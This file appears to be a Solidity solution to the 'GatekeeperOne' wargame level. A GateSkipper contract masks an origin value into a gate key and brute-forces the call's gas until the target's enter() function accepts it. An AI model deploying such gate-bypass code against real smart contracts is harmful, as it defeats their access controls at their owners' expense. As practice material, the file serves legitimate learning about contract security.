// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateSkipper {

    GatekeeperOne public target = GatekeeperOne(0x351a6E432063B56e5695f8BE18A7c8936a029787);
    bytes8 origin = 0x512e6926B1e19C2c;
    bytes8 key = origin & 0xFFFFFFFF0000FFFF;

    function entrance() public returns (bytes memory) {
        for(uint256 i = 0; i < 120; i++) {
            (bool result, bytes memory data) = address(target).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
            if(result) return data;
        }
    }
}

contract GatekeeperOne {

    modifier gateOne() {
        _;
    }
    modifier gateTwo() {
        _;
     }
    modifier gateThree(bytes8 _gateKey) {
        _;
     }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) { }

}
